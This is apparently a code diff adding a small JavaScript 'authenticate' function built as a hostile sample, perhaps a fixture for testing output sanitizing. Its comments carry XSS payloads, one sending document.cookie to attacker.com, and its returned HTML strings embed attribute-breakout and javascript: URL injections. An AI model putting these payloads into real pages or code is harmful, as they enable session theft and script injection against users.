@@ -1,0 +1,9 @@
+function authenticate(user) {
+    // Hostile payload injection:
+    // <script>alert('xss_attack_vector')</script>
+    // <img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
+    if (user.role === "admin" && user.verified) {
+        return "<div class='greeting'>Welcome, \" onmouseover=\"alert(1)\" data-info='&lt;pwned&gt;'></div>";
+    }
+    return "<div class='error' style=\"background: url('javascript:alert(1)')\">Access Denied & Refused</div>";
+}
